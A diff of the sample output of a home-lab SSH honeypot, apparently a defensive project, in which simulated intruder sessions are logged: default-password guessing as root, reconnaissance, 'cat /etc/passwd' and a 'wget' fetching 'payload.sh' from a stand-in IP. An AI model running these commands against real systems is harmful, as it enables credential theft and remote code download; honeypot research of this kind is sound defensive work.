@@ -1,20 +1,20 @@
 ⚠  Honeypot de laboratorio — actividad autorizada
    Trampa SSH (emulación en texto): 127.0.0.1:2222
    Trampa web (login falso):         127.0.0.1:8080
-   Registro: /home/runer/Projects/github_proyectos/publico/honeypot-casero/logs/honeypot.jsonl
+   Registro: logs/honeypot.jsonl
    Ctrl-C para detener.
 
-2026-11-21T00:57:25Z [ssh] 127.0.0.1:46774 connect
-2026-11-21T00:57:25Z [ssh] 127.0.0.1:46774 login_attempt user=root password=123456 result=denied
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 login_attempt user=root password=admin result=denied
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 login_attempt user=root password=toor result=accepted
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 login_accepted user=root
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=uname -a
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=whoami
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=id
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=ls
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=cat /etc/passwd
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=wget http://198.51.100.7/payload.sh
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 download_attempt command=wget http://198.51.100.7/payload.sh url=http://198.51.100.7/payload.sh archivo=payload.sh bytes=1024 herramienta=wget
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 command command=exit
-2026-11-21T00:57:26Z [ssh] 127.0.0.1:46774 session_end duration=0s
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 connect
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=123456 result=denied
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=admin result=denied
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_attempt user=root password=toor result=accepted
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 login_accepted user=root
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=uname -a
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=whoami
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=id
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=ls
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=cat /etc/passwd
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=wget http://198.51.100.7/payload.sh
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 download_attempt command=wget http://198.51.100.7/payload.sh url=http://198.51.100.7/payload.sh archivo=payload.sh bytes=1024 herramienta=wget
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 command command=exit
+2026-11-21T02:37:22Z [ssh] 127.0.0.1:48044 session_end duration=0s
